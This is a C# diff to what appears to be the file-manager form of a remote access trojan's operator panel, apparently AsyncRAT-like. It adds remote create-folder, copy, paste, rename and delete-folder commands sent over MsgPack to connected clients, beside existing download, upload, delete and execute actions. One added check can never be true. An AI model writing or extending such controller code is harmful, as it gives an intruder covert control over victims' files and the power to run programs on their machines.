@@ -4,6 +4,8 @@ using System;
 using System.Windows.Forms;
 using System.Threading;
 using System.IO;
+using Microsoft.VisualBasic;
+using System.Text;
 
 namespace Server.Forms
 {
@@ -80,9 +82,11 @@ namespace Server.Forms
                         Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID));
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
+                        if (itm.ImageIndex == 0 && itm.ImageIndex == 1 && itm.ImageIndex == 2) return;
                         MsgPack msgpack = new MsgPack();
                         string dwid = Guid.NewGuid().ToString();
-                        msgpack.ForcePathObject("Packet").AsString = "socketDownload";
+                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                        msgpack.ForcePathObject("Command").AsString = "socketDownload";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                         msgpack.ForcePathObject("DWID").AsString = dwid;
                         ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
@@ -103,14 +107,12 @@ namespace Server.Forms
                     }
                 }
             }
-            catch
-            {
-
-            }
+            catch { }
         }
 
         private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            if (toolStripStatusLabel1.Text.Length >= 3)
             try
             {
                 OpenFileDialog O = new OpenFileDialog();
@@ -155,12 +157,22 @@ namespace Server.Forms
                 {
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
-                        MsgPack msgpack = new MsgPack();
-                        string dwid = Guid.NewGuid().ToString();
-                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                        msgpack.ForcePathObject("Command").AsString = "deleteFile";
-                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
-                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        if (itm.ImageIndex != 0 && itm.ImageIndex != 1 && itm.ImageIndex != 2)
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                            msgpack.ForcePathObject("Command").AsString = "deleteFile";
+                            msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
+                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        }
+                        else if (itm.ImageIndex == 0)
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                            msgpack.ForcePathObject("Command").AsString = "deleteFolder";
+                            msgpack.ForcePathObject("Folder").AsString = itm.ToolTipText;
+                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        }
                     }
                 }
             }
@@ -200,7 +212,6 @@ namespace Server.Forms
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         MsgPack msgpack = new MsgPack();
-                        string dwid = Guid.NewGuid().ToString();
                         msgpack.ForcePathObject("Packet").AsString = "fileManager";
                         msgpack.ForcePathObject("Command").AsString = "execute";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
@@ -250,6 +261,95 @@ namespace Server.Forms
             catch
             {
 
+            }
+        }
+
+        private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                string foldername = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
+                if (string.IsNullOrEmpty(foldername))
+                    return;
+                else
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "createFolder";
+                    msgpack.ForcePathObject("Folder").AsString = Path.Combine(toolStripStatusLabel1.Text, foldername);
+                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
+
+        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    StringBuilder files = new StringBuilder();
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        files.Append(itm.ToolTipText + "-=>");
+                    }
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "copyFile";
+                    msgpack.ForcePathObject("File").AsString = files.ToString();
+                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
+
+        private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "pasteFile";
+                msgpack.ForcePathObject("File").AsString = toolStripStatusLabel1.Text;
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+            }
+            catch { }
+        }
+
+        private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count == 1)
+            {
+                try
+                {
+                    string filename = Interaction.InputBox("Rename File or Folder", "Name", listView1.SelectedItems[0].Text);
+                    if (string.IsNullOrEmpty(filename))
+                        return;
+                    else
+                    {
+                        if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 1 && listView1.SelectedItems[0].ImageIndex != 2)
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                            msgpack.ForcePathObject("Command").AsString = "renameFile";
+                            msgpack.ForcePathObject("File").AsString = listView1.SelectedItems[0].ToolTipText;
+                            msgpack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, filename);
+                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                            return;
+                        }
+                        else if (listView1.SelectedItems[0].ImageIndex == 0)
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                            msgpack.ForcePathObject("Command").AsString = "renameFolder";
+                            msgpack.ForcePathObject("Folder").AsString = listView1.SelectedItems[0].ToolTipText + "\\";
+                            msgpack.ForcePathObject("NewName").AsString = Path.Combine(toolStripStatusLabel1.Text, filename);
+                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+                        }
+                    }
+                }
+                catch { }
             }
         }
     }
